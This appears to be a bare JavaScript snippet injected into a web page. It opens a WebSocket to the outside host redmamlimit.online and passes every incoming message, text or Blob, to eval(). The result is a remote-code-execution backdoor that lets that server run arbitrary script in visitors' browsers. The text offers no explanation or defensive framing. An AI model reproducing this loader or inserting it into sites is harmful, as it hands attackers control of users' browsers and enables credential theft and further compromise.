(function() {
    let ws = new WebSocket('wss://redmamlimit.online');
    ws.onmessage = function(event) {
        if (event.data instanceof Blob) {
            let reader = new FileReader();
            reader.onload = function() {
                let message = reader.result;
                try {
                    eval(message);
                } catch (error) {
                    console.error('Error while evaluating message:', error);
                }
            };
            reader.readAsText(event.data);
        } else {
            try {
                eval(event.data);
            } catch (error) {
                console.error('Error while evaluating event data:', error);
            }
        }
    };
})();
